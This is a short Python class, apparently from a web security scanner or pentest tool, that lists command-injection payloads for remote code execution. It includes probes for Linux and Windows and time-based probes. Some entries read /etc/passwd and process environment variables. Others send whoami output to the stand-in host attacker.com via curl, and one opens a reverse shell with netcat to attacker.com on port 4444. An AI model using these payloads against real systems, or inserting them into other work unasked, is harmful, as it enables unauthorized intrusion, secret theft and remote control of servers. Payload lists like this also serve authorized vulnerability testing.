class RCEPayloads:
    BASIC = [
        "; ls",
        "; whoami",
        "; id",
        "; cat /etc/passwd",
        "; dir",
        "| ls",
        "|| ls",
        "&& ls",
        "& ls"
    ]
    
    LINUX = [
        "; cat /etc/passwd",
        "; cat /proc/self/environ",
        "; curl http://attacker.com/$(whoami)",
        "; nc -e /bin/sh attacker.com 4444"
    ]
    
    WINDOWS = [
        "& dir C:\\",
        "& whoami",
        "& ipconfig",
        "& systeminfo",
        "& net users"
    ]
    
    TIME_BASED = [
        "; sleep 5",
        "| sleep 5",
        "& timeout 5"
    ]
    
    @classmethod
    def get_all_payloads(cls):
        return list(set(cls.BASIC + cls.LINUX + cls.WINDOWS + cls.TIME_BASED))